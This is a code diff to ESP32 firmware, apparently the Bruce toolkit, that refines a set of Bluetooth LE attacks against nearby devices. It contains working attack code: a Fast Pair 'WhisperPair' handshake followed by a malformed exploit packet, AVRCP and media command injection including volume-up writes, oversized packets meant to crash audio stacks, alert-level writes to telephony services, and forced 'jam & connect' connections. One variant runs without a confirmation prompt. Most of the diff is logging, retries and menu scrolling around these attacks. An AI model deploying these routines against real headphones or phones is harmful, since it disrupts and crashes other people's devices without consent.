@@ -19,177 +19,198 @@ bool isBLEInitialized() {
 
 void BLEAttackManager::prepareForConnection() {
     Serial.println("[BLE] Preparing for attack connection...");
-
+    
     wasScanning = false;
-
+    
     if(isBLEInitialized()) {
-        if(NimBLEDevice::getScan()) {
-            wasScanning = NimBLEDevice::getScan()->isScanning();
-            if(wasScanning) {
-                NimBLEDevice::getScan()->stop();
-                delay(350);
-            }
+        if(NimBLEDevice::getScan() && NimBLEDevice::getScan()->isScanning()) {
+            wasScanning = true;
+            Serial.println("[BLE] Stopping active scan...");
+            NimBLEDevice::getScan()->stop();
+            delay(500);
         }
-
+        
+        Serial.println("[BLE] Deinitializing BLE...");
         NimBLEDevice::deinit(true);
-        delay(500);
+        delay(800);
     }
-
+    
+    Serial.println("[BLE] Initializing for attack mode...");
     NimBLEDevice::init("Bruce-Attack");
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
     NimBLEDevice::setSecurityAuth(false, false, false);
     NimBLEDevice::setMTU(247);
-
+    
+    delay(500);
+    Serial.println("[BLE] BLE ready for attack");
     isInAttackMode = true;
-    delay(200);
 }
 
 void BLEAttackManager::cleanupAfterAttack() {
     if(!isInAttackMode) return;
-
+    
+    Serial.println("[BLE] Cleaning up attack mode...");
+    
     if(isBLEInitialized()) {
-        NimBLEDevice::deinit(false);
+        NimBLEDevice::deinit(true);
     }
-
+    
+    delay(500);
     isInAttackMode = false;
-    delay(300);
+    Serial.println("[BLE] Cleanup complete");
 }
 
 bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outClient) {
     if(!isBLEInitialized()) {
+        Serial.println("[BLE] ERROR: BLE not initialized!");
         return false;
     }
-
+    
     size_t freeHeap = esp_get_free_heap_size();
-    if(freeHeap < 40000) {
+    Serial.printf("[BLE] Free heap: %d bytes\n", freeHeap);
+    
+    if(freeHeap < 35000) {
+        Serial.println("[BLE] WARNING: Low heap memory");
         delay(500);
     }
-
+    
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) {
+        Serial.println("[BLE] ERROR: Failed to create client");
         return false;
     }
-
-    pClient->setConnectTimeout(10);
+    
+    pClient->setConnectTimeout(15);
     pClient->setConnectionParams(12, 12, 0, 400);
-
+    
+    Serial.printf("[BLE] Connecting to %s...\n", target.toString().c_str());
+    
     bool connected = false;
-    for(int attempt = 0; attempt < 2 && !connected; attempt++) {
+    for(int attempt = 0; attempt < 3 && !connected; attempt++) {
         if(attempt > 0) {
-            delay(500);
+            Serial.printf("[BLE] Retry attempt %d...\n", attempt + 1);
+            delay(800);
         }
-
+        
         connected = pClient->connect(target, true);
-
+        
         if(connected) {
             int waitTries = 0;
-            while(!pClient->isConnected() && waitTries < 20) {
+            while(!pClient->isConnected() && waitTries < 30) {
                 delay(100);
                 waitTries++;
             }
-
+            
             if(pClient->isConnected()) {
-                delay(200);
+                Serial.println("[BLE] Connection established!");
+                delay(300);
                 break;
             } else {
+                Serial.println("[BLE] Connection timeout");
                 connected = false;
+                if(pClient->isConnected()) {
+                    pClient->disconnect();
+                }
             }
+        } else {
+            Serial.printf("[BLE] Connection attempt %d failed\n", attempt + 1);
         }
     }
-
+    
     if(!connected) {
+        Serial.println("[BLE] Connection failed after retries");
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
+    
     *outClient = pClient;
     return true;
 }
 
 NimBLERemoteCharacteristic* WhisperPairExploit::findKBPCharacteristic(NimBLERemoteService* fastpairService) {
     if(!fastpairService) return nullptr;
-
+    
     const char* kbpUuids[] = {
         "a92ee202-5501-4e6b-90fb-79a8c1f2e5a8",
         "1234",
         "fe2c1234-8366-4814-8eb0-01de32100bea",
         nullptr
     };
-
+    
     for(int i = 0; kbpUuids[i] != nullptr; i++) {
         NimBLERemoteCharacteristic* ch = fastpairService->getCharacteristic(NimBLEUUID(kbpUuids[i]));
         if(ch && ch->canWrite()) {
             return ch;
         }
     }
-
+    
     const std::vector<NimBLERemoteCharacteristic*>& chars = fastpairService->getCharacteristics(true);
     for(auto& ch : chars) {
         if(ch->canWrite()) {
             return ch;
         }
     }
-
+    
     return nullptr;
 }
 
 bool WhisperPairExploit::performHandshake(NimBLERemoteCharacteristic* kbpChar) {
     if(!kbpChar) return false;
-
+    
     uint8_t public_key[65];
     size_t pub_len = 65;
-
+    
     if(!crypto.generateValidKeyPair(public_key, &pub_len)) {
         return false;
     }
-
+    
     uint8_t seeker_hello[67] = {0};
     seeker_hello[0] = 0x00;
     seeker_hello[1] = 0x00;
     memcpy(&seeker_hello[2], public_key, 65);
-
+    
     bool success = kbpChar->writeValue(seeker_hello, 67, true);
-
+    
     if(success) {
         delay(300);
     }
-
+    
     return success;
 }
 
 bool WhisperPairExploit::sendExploitPayload(NimBLERemoteCharacteristic* kbpChar) {
     if(!kbpChar) return false;
-
+    
     uint8_t exploit_packet[120];
-
+    
     exploit_packet[0] = 0x02;
     exploit_packet[1] = 0xFF;
-
+    
     uint8_t fake_nonce[16];
     crypto.generateValidNonce(fake_nonce);
     memcpy(&exploit_packet[2], fake_nonce, 16);
-
+    
     for(int i = 18; i < sizeof(exploit_packet); i++) {
         exploit_packet[i] = 0x41 + ((i - 18) % 26);
     }
-
+    
     exploit_packet[sizeof(exploit_packet) - 1] = 0x00;
-
+    
     bool sent = kbpChar->writeValue(exploit_packet, sizeof(exploit_packet), true);
-
+    
     if(sent) {
         delay(600);
     }
-
+    
     return sent;
 }
 
 bool WhisperPairExploit::testForVulnerability(NimBLERemoteCharacteristic* kbpChar) {
     if(!kbpChar) return false;
-
+    
     try {
         std::string response = kbpChar->readValue();
-
+        
         if(response.empty()) {
             return true;
         } else {
@@ -200,7 +221,7 @@ bool WhisperPairExploit::testForVulnerability(NimBLERemoteCharacteristic* kbpCha
     } catch(...) {
         return true;
     }
-
+    
     return false;
 }
 
@@ -208,23 +229,23 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
     if(!confirmAttack(target.toString().c_str())) {
         return false;
     }
-
+    
     bleManager.prepareForConnection();
-
+    
     NimBLEClient* pClient = nullptr;
     if(!bleManager.connectToDevice(target, &pClient)) {
         showAttackResult(false, "Connection failed");
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     if(!pClient->discoverAttributes()) {
         showAttackResult(false, "Service discovery failed");
         pClient->disconnect();
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         showAttackResult(false, "FastPair service not found");
@@ -232,7 +253,7 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
     if(!pKbpChar) {
         showAttackResult(false, "No writable KBP characteristic");
@@ -240,25 +261,25 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     delay(500);
-
+    
     bool isVulnerable = false;
-
+    
     if(performHandshake(pKbpChar)) {
         delay(400);
-
+        
         if(sendExploitPayload(pKbpChar)) {
             delay(400);
             isVulnerable = testForVulnerability(pKbpChar);
         }
     }
-
+    
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
     bleManager.cleanupAfterAttack();
-
+    
     if(isVulnerable) {
         showAttackResult(true, "DEVICE MAY BE VULNERABLE!");
         return true;
@@ -270,107 +291,107 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
 
 bool WhisperPairExploit::executeSilent(NimBLEAddress target) {
     bleManager.prepareForConnection();
-
+    
     NimBLEClient* pClient = nullptr;
     if(!bleManager.connectToDevice(target, &pClient)) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     if(!pClient->discoverAttributes()) {
         pClient->disconnect();
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         pClient->disconnect();
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
     if(!pKbpChar) {
         pClient->disconnect();
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     bool handshakeOk = performHandshake(pKbpChar);
     delay(300);
     bool exploitSent = sendExploitPayload(pKbpChar);
     delay(500);
     bool crashed = testForVulnerability(pKbpChar);
-
+    
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
     bleManager.cleanupAfterAttack();
-
+    
     return (handshakeOk && exploitSent && crashed);
 }
 
 bool AudioAttackService::findAndAttackAudioServices(NimBLEClient* pClient) {
     if(!pClient || !pClient->isConnected()) return false;
-
+    
     if(!pClient->discoverAttributes()) {
         return false;
     }
-
+    
     bool anyAttackSuccess = false;
-
+    
     const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
-
+    
     for(auto& service : services) {
         NimBLEUUID uuid = service->getUUID();
         std::string uuidStr = uuid.toString();
-
+        
         if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) {
             if(attackAVRCP(service)) {
                 anyAttackSuccess = true;
             }
         }
-
+        
         else if(uuidStr.find("1843") != std::string::npos || uuidStr.find("b4b4") != std::string::npos) {
             if(attackAudioMedia(service)) {
                 anyAttackSuccess = true;
             }
         }
-
+        
         else if(uuidStr.find("1124") != std::string::npos || uuidStr.find("1125") != std::string::npos) {
             if(attackTelephony(service)) {
                 anyAttackSuccess = true;
             }
         }
-
+        
         else if(uuidStr.find("1844") != std::string::npos) {
             if(attackAudioMedia(service)) {
                 anyAttackSuccess = true;
             }
         }
     }
-
+    
     return anyAttackSuccess;
 }
 
 bool AudioAttackService::attackAVRCP(NimBLERemoteService* avrcpService) {
     if(!avrcpService) return false;
-
+    
     NimBLERemoteCharacteristic* pChar = nullptr;
-
+    
     const char* avrcpUuids[] = {
         "b4b40101-b4b4-4a8f-9deb-bc87b8e0a8f5",
         "0000110e-0000-1000-8000-00805f9b34fb",
         "0000110f-0000-1000-8000-00805f9b34fb",
         nullptr
     };
-
+    
     for(int i = 0; avrcpUuids[i] != nullptr; i++) {
         pChar = avrcpService->getCharacteristic(NimBLEUUID(avrcpUuids[i]));
         if(pChar && pChar->canWrite()) break;
     }
-
+    
     if(!pChar) {
         const std::vector<NimBLERemoteCharacteristic*>& chars = avrcpService->getCharacteristics(true);
         for(auto& ch : chars) {
@@ -380,52 +401,52 @@ bool AudioAttackService::attackAVRCP(NimBLERemoteService* avrcpService) {
             }
         }
     }
-
+    
     if(!pChar) {
         return false;
     }
-
+    
     uint8_t playCmd[] = {0x00, 0x48, 0x00, 0x00, 0x00};
     bool playSent = pChar->writeValue(playCmd, sizeof(playCmd), true);
-
+    
     delay(200);
-
+    
     uint8_t volUpCmd[] = {0x00, 0x44, 0x00, 0x00, 0x00};
     bool volSent = pChar->writeValue(volUpCmd, sizeof(volUpCmd), true);
-
+    
     delay(200);
-
+    
     uint8_t oversizedPacket[256];
     memset(oversizedPacket, 0x41, sizeof(oversizedPacket));
     oversizedPacket[0] = 0xFF;
     oversizedPacket[1] = 0xFF;
-
+    
     bool crashSent = pChar->writeValue(oversizedPacket, sizeof(oversizedPacket), true);
-
+    
     delay(300);
     uint8_t invalidState[] = {0x00, 0xFF, 0xFF, 0xFF, 0xFF};
     bool stateSent = pChar->writeValue(invalidState, sizeof(invalidState), true);
-
+    
     return (playSent || volSent || crashSent || stateSent);
 }
 
 bool AudioAttackService::attackAudioMedia(NimBLERemoteService* mediaService) {
     if(!mediaService) return false;
-
+    
     NimBLERemoteCharacteristic* pMediaChar = nullptr;
-
+    
     const char* mediaUuids[] = {
         "b4b40201-b4b4-4a8f-9deb-bc87b8e0a8f5",
         "00002b01-0000-1000-8000-00805f9b34fb",
         "00002b02-0000-1000-8000-00805f9b34fb",
         nullptr
     };
-
+    
     for(int i = 0; mediaUuids[i] != nullptr; i++) {
         pMediaChar = mediaService->getCharacteristic(NimBLEUUID(mediaUuids[i]));
         if(pMediaChar && pMediaChar->canWrite()) break;
     }
-
+    
     if(!pMediaChar) {
         const std::vector<NimBLERemoteCharacteristic*>& chars = mediaService->getCharacteristics(true);
         for(auto& ch : chars) {
@@ -435,11 +456,11 @@ bool AudioAttackService::attackAudioMedia(NimBLERemoteService* mediaService) {
             }
         }
     }
-
+    
     if(!pMediaChar) {
         return false;
     }
-
+    
     uint8_t commands[][5] = {
         {0x01, 0x00, 0x00, 0x00, 0x00},
         {0x02, 0x00, 0x00, 0x00, 0x00},
@@ -449,68 +470,68 @@ bool AudioAttackService::attackAudioMedia(NimBLERemoteService* mediaService) {
         {0x06, 0x00, 0x00, 0x00, 0x00},
         {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
     };
-
+    
     bool anySent = false;
     for(int i = 0; i < 7; i++) {
         bool sent = pMediaChar->writeValue(commands[i], 5, true);
         if(sent) anySent = true;
         delay(150);
     }
-
+    
     return anySent;
 }
 
 bool AudioAttackService::attackTelephony(NimBLERemoteService* teleService) {
     if(!teleService) return false;
-
+    
     NimBLERemoteCharacteristic* pAlertChar = nullptr;
-
+    
     const char* alertUuids[] = {
         "00002a43-0000-1000-8000-00805f9b34fb",
         "00002a44-0000-1000-8000-00805f9b34fb",
         "00002a45-0000-1000-8000-00805f9b34fb",
         nullptr
     };
-
+    
     for(int i = 0; alertUuids[i] != nullptr; i++) {
         pAlertChar = teleService->getCharacteristic(NimBLEUUID(alertUuids[i]));
         if(pAlertChar && pAlertChar->canWrite()) break;
     }
-
+    
     if(!pAlertChar) {
         return false;
     }
-
+    
     uint8_t alertHigh[] = {0x02};
     uint8_t alertMild[] = {0x01};
     uint8_t invalidAlert[] = {0xFF};
-
+    
     bool alert1 = pAlertChar->writeValue(alertHigh, 1, true);
     delay(300);
     bool alert2 = pAlertChar->writeValue(alertMild, 1, true);
     delay(300);
     bool alert3 = pAlertChar->writeValue(invalidAlert, 1, true);
-
+    
     return (alert1 || alert2 || alert3);
 }
 
 bool AudioAttackService::executeAudioAttack(NimBLEAddress target) {
     BLEAttackManager bleManager;
     bleManager.prepareForConnection();
-
+    
     NimBLEClient* pClient = nullptr;
     if(!bleManager.connectToDevice(target, &pClient)) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     bool success = findAndAttackAudioServices(pClient);
-
+    
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
     bleManager.cleanupAfterAttack();
-
+    
     return success;
 }
 
@@ -521,30 +542,30 @@ bool AudioAttackService::injectMediaCommands(NimBLEAddress target) {
 bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
     BLEAttackManager bleManager;
     bleManager.prepareForConnection();
-
+    
     NimBLEClient* pClient = nullptr;
     if(!bleManager.connectToDevice(target, &pClient)) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     if(!pClient->discoverAttributes()) {
         pClient->disconnect();
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
     if(!pService) {
         pService = pClient->getService(NimBLEUUID((uint16_t)0x110F));
     }
-
+    
     if(!pService) {
         pClient->disconnect();
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     NimBLERemoteCharacteristic* pChar = nullptr;
     const std::vector<NimBLERemoteCharacteristic*>& chars = pService->getCharacteristics(true);
     for(auto& ch : chars) {
@@ -553,32 +574,32 @@ bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
             break;
         }
     }
-
+    
     if(!pChar) {
         pClient->disconnect();
         bleManager.cleanupAfterAttack();
         return false;
     }
-
+    
     uint8_t crashPacket1[128];
     uint8_t crashPacket2[64];
     uint8_t crashPacket3[256];
-
+    
     memset(crashPacket1, 0xFF, sizeof(crashPacket1));
     memset(crashPacket2, 0x00, sizeof(crashPacket2));
     memset(crashPacket3, 0x41, sizeof(crashPacket3));
-
+    
     bool sent1 = pChar->writeValue(crashPacket1, sizeof(crashPacket1), true);
     delay(200);
     bool sent2 = pChar->writeValue(crashPacket2, sizeof(crashPacket2), true);
     delay(200);
     bool sent3 = pChar->writeValue(crashPacket3, sizeof(crashPacket3), true);
-
+    
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
     bleManager.cleanupAfterAttack();
-
+    
     return (sent1 || sent2 || sent3);
 }
 
@@ -587,7 +608,7 @@ AudioCommandService::AudioCommandService() : pServer(nullptr), pAudioService(nul
 void AudioCommandService::start() {
     NimBLEDevice::init("Audio-Injector");
     pServer = NimBLEDevice::createServer();
-
+    
     class ServerCallbacks : public NimBLEServerCallbacks {
         AudioCommandService* parent;
     public:
@@ -595,15 +616,15 @@ void AudioCommandService::start() {
         void onConnect(NimBLEServer* pServer) { parent->isConnected = true; }
         void onDisconnect(NimBLEServer* pServer) { parent->isConnected = false; }
     };
-
+    
     pServer->setCallbacks(new ServerCallbacks(this));
-
+    
     pAudioService = pServer->createService("AUDIO1234-5678-9012-3456-789012345678");
     pCmdCharacteristic = pAudioService->createCharacteristic(
         "CMD1234-5678-9012-3456-789012345678",
         NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::WRITE_NR
     );
-
+    
     pAudioService->start();
     NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
     pAdvertising->addServiceUUID(pAudioService->getUUID());
@@ -670,7 +691,10 @@ void showAttackMenuWithTarget(NimBLEAddress target) {
     };
     
     int selectedAttack = 0;
+    int scrollOffset = 0;
     bool exitMenu = false;
+    
+    const int VISIBLE_ITEMS = 7;
     
     while(!exitMenu) {
         clearMenu();
@@ -696,31 +720,40 @@ void showAttackMenuWithTarget(NimBLEAddress target) {
         tft.setCursor(20, 65);
         tft.println("Select Attack Type:");
         
-        for(int i = 0; i < MAX_ATTACKS; i++) {
-            int yPos = 90 + (i * 22);
+        for(int i = 0; i < VISIBLE_ITEMS && (scrollOffset + i) < MAX_ATTACKS; i++) {
+            int attackIdx = scrollOffset + i;
+            int yPos = 90 + (i * 25);
             
-            if(i == selectedAttack) {
-                tft.fillRect(25, yPos, tftWidth - 50, 20, TFT_WHITE);
+            if(attackIdx == selectedAttack) {
+                tft.fillRect(25, yPos, tftWidth - 50, 22, TFT_WHITE);
                 tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                tft.setCursor(30, yPos + 5);
+                tft.setCursor(30, yPos + 6);
                 tft.print("> ");
             } else {
-                tft.fillRect(25, yPos, tftWidth - 50, 20, bruceConfig.bgColor);
+                tft.fillRect(25, yPos, tftWidth - 50, 22, bruceConfig.bgColor);
                 tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                tft.setCursor(30, yPos + 5);
+                tft.setCursor(30, yPos + 6);
                 tft.print("  ");
             }
             
-            String displayName = attackNames[i];
+            String displayName = attackNames[attackIdx];
             if(displayName.length() > 24) {
                 displayName = displayName.substring(0, 21) + "...";
             }
             tft.print(displayName);
         }
         
+        if(MAX_ATTACKS > VISIBLE_ITEMS) {
+            tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+            tft.setCursor(tftWidth - 30, 90);
+            tft.print("v");
+            tft.setCursor(tftWidth - 30, 90 + (VISIBLE_ITEMS * 25) - 25);
+            tft.print("^");
+        }
+        
         tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
-        tft.fillRect(20, 310, tftWidth - 40, 20, bruceConfig.bgColor);
-        tft.setCursor(20, 310);
+        tft.fillRect(20, 280, tftWidth - 40, 20, bruceConfig.bgColor);
+        tft.setCursor(20, 280);
         
         String desc = attackDescriptions[selectedAttack];
         if(desc.length() > 38) {
@@ -729,7 +762,7 @@ void showAttackMenuWithTarget(NimBLEAddress target) {
         tft.print(desc);
         
         tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-        tft.setCursor(20, 335);
+        tft.setCursor(20, 310);
         tft.print("PREV/NEXT: Navigate  SEL: Execute  ESC: Back");
         
         bool inputProcessed = false;
@@ -743,12 +776,28 @@ void showAttackMenuWithTarget(NimBLEAddress target) {
             }
             else if(check(PrevPress)) {
                 delay(150);
-                selectedAttack = (selectedAttack > 0) ? selectedAttack - 1 : MAX_ATTACKS - 1;
+                if(selectedAttack > 0) {
+                    selectedAttack--;
+                    if(selectedAttack < scrollOffset) {
+                        scrollOffset = selectedAttack;
+                    }
+                } else {
+                    selectedAttack = MAX_ATTACKS - 1;
+                    scrollOffset = std::max(0, MAX_ATTACKS - VISIBLE_ITEMS);
+                }
                 inputProcessed = true;
             }
             else if(check(NextPress)) {
                 delay(150);
-                selectedAttack = (selectedAttack + 1) % MAX_ATTACKS;
+                if(selectedAttack < MAX_ATTACKS - 1) {
+                    selectedAttack++;
+                    if(selectedAttack >= scrollOffset + VISIBLE_ITEMS) {
+                        scrollOffset = selectedAttack - VISIBLE_ITEMS + 1;
+                    }
+                } else {
+                    selectedAttack = 0;
+                    scrollOffset = 0;
+                }
                 inputProcessed = true;
             }
             else if(check(SelPress)) {
@@ -989,25 +1038,24 @@ void runJamConnectAttack(NimBLEAddress target) {
     
     showAttackProgress("Preparing jam & connect...", TFT_WHITE);
     
-    if(NimBLEDevice::getScan()) {
-        NimBLEDevice::getScan()->stop();
-    }
-    
     NimBLEDevice::deinit(true);
-    delay(500);
+    delay(800);
     
     NimBLEDevice::init("Bruce-Jammer");
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+    delay(300);
     
     showAttackProgress("Attempting forced connection...", TFT_YELLOW);
     
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) {
         showAttackResult(false, "Failed to create client");
+        NimBLEDevice::deinit(true);
         return;
     }
     
-    pClient->setConnectTimeout(3);
+    pClient->setConnectTimeout(5);
+    pClient->setConnectionParams(6, 6, 0, 200);
     
     bool connected = false;
     for(int attempt = 0; attempt < 5 && !connected; attempt++) {
@@ -1018,13 +1066,13 @@ void runJamConnectAttack(NimBLEAddress target) {
         connected = pClient->connect(target, false);
         
         if(!connected) {
-            delay(200);
+            delay(500);
         }
     }
     
     if(connected) {
         showAttackProgress("Connected! Discovering...", TFT_GREEN);
-        delay(300);
+        delay(500);
         
         if(pClient->discoverAttributes()) {
             showAttackResult(true, "Forced connection successful!");
@@ -1041,6 +1089,7 @@ void runJamConnectAttack(NimBLEAddress target) {
     
     NimBLEDevice::deleteClient(pClient);
     NimBLEDevice::deinit(true);
+    delay(500);
 }
 
 void runHIDTest(NimBLEAddress target) {
@@ -1291,14 +1340,13 @@ void audioCommandHijackTest() {
 
 void executeAudioTest(int testIndex, NimBLEAddress target) {
     AudioAttackService audioAttack;
+    BLEAttackManager bleManager;
     
     switch(testIndex) {
         case 0:
             showAttackProgress("Testing AVRCP service...", TFT_WHITE);
+            bleManager.prepareForConnection();
             {
-                BLEAttackManager bleManager;
-                bleManager.prepareForConnection();
-                
                 NimBLEClient* pClient = nullptr;
                 if(bleManager.connectToDevice(target, &pClient)) {
                     if(pClient->discoverAttributes()) {
@@ -1321,10 +1369,8 @@ void executeAudioTest(int testIndex, NimBLEAddress target) {
             
         case 1:
             showAttackProgress("Testing Media Control...", TFT_WHITE);
+            bleManager.prepareForConnection();
             {
-                BLEAttackManager bleManager;
-                bleManager.prepareForConnection();
-                
                 NimBLEClient* pClient = nullptr;
                 if(bleManager.connectToDevice(target, &pClient)) {
                     if(pClient->discoverAttributes()) {
@@ -1347,10 +1393,8 @@ void executeAudioTest(int testIndex, NimBLEAddress target) {
             
         case 2:
             showAttackProgress("Testing Telephony...", TFT_WHITE);
+            bleManager.prepareForConnection();
             {
-                BLEAttackManager bleManager;
-                bleManager.prepareForConnection();
-                
                 NimBLEClient* pClient = nullptr;
                 if(bleManager.connectToDevice(target, &pClient)) {
                     if(pClient->discoverAttributes()) {
@@ -1514,14 +1558,16 @@ String selectTargetFromScan(const char* title) {
     tft.print("Initializing scanner...");
 
     NimBLEDevice::deinit(true);
-    delay(100);
+    delay(800);
     NimBLEDevice::init("Bruce-Scanner");
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
     NimBLEDevice::setSecurityAuth(false, false, false);
+    delay(300);
 
     NimBLEScan* pBLEScan = NimBLEDevice::getScan();
     if(!pBLEScan) {
         showErrorMessage("Failed to create scanner");
+        NimBLEDevice::deinit(true);
         return "";
     }
 
@@ -1550,6 +1596,7 @@ String selectTargetFromScan(const char* title) {
     while (millis() - scanStart < 15000) {
         if (check(EscPress)) {
             pBLEScan->stop();
+            NimBLEDevice::deinit(true);
             return "";
         }
         delay(10);
@@ -1589,6 +1636,8 @@ String selectTargetFromScan(const char* title) {
     }
 
     pBLEScan->clearResults();
+    NimBLEDevice::deinit(true);
+    delay(300);
 
     if(devices.empty()) {
         showWarningMessage("NO DEVICES FOUND");
